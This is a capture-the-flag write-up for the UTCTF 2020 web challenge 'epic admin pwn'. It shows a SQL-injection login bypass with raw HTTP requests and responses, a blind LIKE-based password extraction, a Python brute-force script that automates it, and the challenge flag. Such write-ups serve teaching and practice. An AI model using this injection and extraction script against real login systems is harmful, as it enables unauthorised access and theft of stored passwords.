# UTCTF 2020 – epic admin pwn

* **Category:** web
* **Points:** 50

## Challenge

> this challenge is epic i promise
> 
> the flag is the password
> 
> http://web2.utctf.live:5006/
> 
> by matt

## Solution

The web site is basically a login form vulnerable to SQL injection. A simple payload like `' or '1'='1` can be used to discover this.

```
POST / HTTP/1.1
Host: web2.utctf.live:5006
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 40
Origin: http://web2.utctf.live:5006
Connection: close
Referer: http://web2.utctf.live:5006/
Upgrade-Insecure-Requests: 1

username=admin&pass=%27+or+%271%27%3D%271

HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Date: Sat, 07 Mar 2020 19:10:08 GMT
Server: Werkzeug/1.0.0 Python/3.8.1
Content-Length: 2496
Connection: Close

<!DOCTYPE html>
<html lang="en">
<head>
	<title>how shot web</title>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
<!--===============================================================================================-->	
	<link rel="icon" type="image/png" href="static/images/icons/favicon.ico"/>
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="static/vendor/bootstrap/css/bootstrap.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="static/fonts/font-awesome-4.7.0/css/font-awesome.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="static/fonts/Linearicons-Free-v1.0.0/icon-font.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="static/vendor/animate/animate.css">
<!--===============================================================================================-->	
	<link rel="stylesheet" type="text/css" href="static/vendor/css-hamburgers/hamburgers.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="static/vendor/animsition/css/animsition.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="static/vendor/select2/select2.min.css">
<!--===============================================================================================-->	
	<link rel="stylesheet" type="text/css" href="static/vendor/daterangepicker/daterangepicker.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="static/css/util.css">
	<link rel="stylesheet" type="text/css" href="static/css/main.css">
<!--===============================================================================================-->
</head>
<body>
	
	<div class="limiter">
		<div class="container-login100">
            <span class="login100-form-title p-b-43">
                Welcome, admin!
            </span>
	
        </div>
	</div>
    </body>
</html>
```

Considering that the password is the flag, you can use SQL `LIKE` clause to discover each character one at a time.

```
POST / HTTP/1.1
Host: web2.utctf.live:5006
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 47
Origin: http://web2.utctf.live:5006
Connection: close
Referer: http://web2.utctf.live:5006/
Upgrade-Insecure-Requests: 1

username=admin&pass=%27+or+password+like+%27u%25

HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Date: Sat, 07 Mar 2020 19:18:38 GMT
Server: Werkzeug/1.0.0 Python/3.8.1
Content-Length: 2496
Connection: Close

<!DOCTYPE html>
<html lang="en">
<head>
	<title>how shot web</title>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
<!--===============================================================================================-->	
	<link rel="icon" type="image/png" href="static/images/icons/favicon.ico"/>
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="static/vendor/bootstrap/css/bootstrap.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="static/fonts/font-awesome-4.7.0/css/font-awesome.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="static/fonts/Linearicons-Free-v1.0.0/icon-font.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="static/vendor/animate/animate.css">
<!--===============================================================================================-->	
	<link rel="stylesheet" type="text/css" href="static/vendor/css-hamburgers/hamburgers.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="static/vendor/animsition/css/animsition.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="static/vendor/select2/select2.min.css">
<!--===============================================================================================-->	
	<link rel="stylesheet" type="text/css" href="static/vendor/daterangepicker/daterangepicker.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="static/css/util.css">
	<link rel="stylesheet" type="text/css" href="static/css/main.css">
<!--===============================================================================================-->
</head>
<body>
	
	<div class="limiter">
		<div class="container-login100">
            <span class="login100-form-title p-b-43">
                Welcome, admin!
            </span>
	
        </div>
	</div>
    </body>
</html>
```

This can be automated with a simple [Python script](epic-admin-pwn.py).

```python
import requests
import string

url_form = "http://web2.utctf.live:5006/"
payload = "username=admin&pass=' or password like '{}%"
possible_chars = list("{}" + string.digits + string.ascii_lowercase + string.ascii_uppercase)
headers = {
   "User-Agent": "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US);", 
   "Content-Type": "application/x-www-form-urlencoded"
}

found_chars = ""
while True:
    for new_char in possible_chars:
        attempt = found_chars + new_char
        print("[*] Attempt: '{}'.".format(attempt))
        data = payload.format(attempt)
        print("[*] Payload: {}.".format(data))
        page = requests.post(url_form, data=data, headers=headers)
    
        if "Welcome" in page.text:
            found_chars += new_char
            print("[*] Found chars: '{}'".format(found_chars))
            break
    
    if found_chars[-1] == "}":
        break
        
print("The FLAG is: {}".format(found_chars))
```

The script will discover the flag.

```
utflag{dual1pa1sp3rf3ct}
```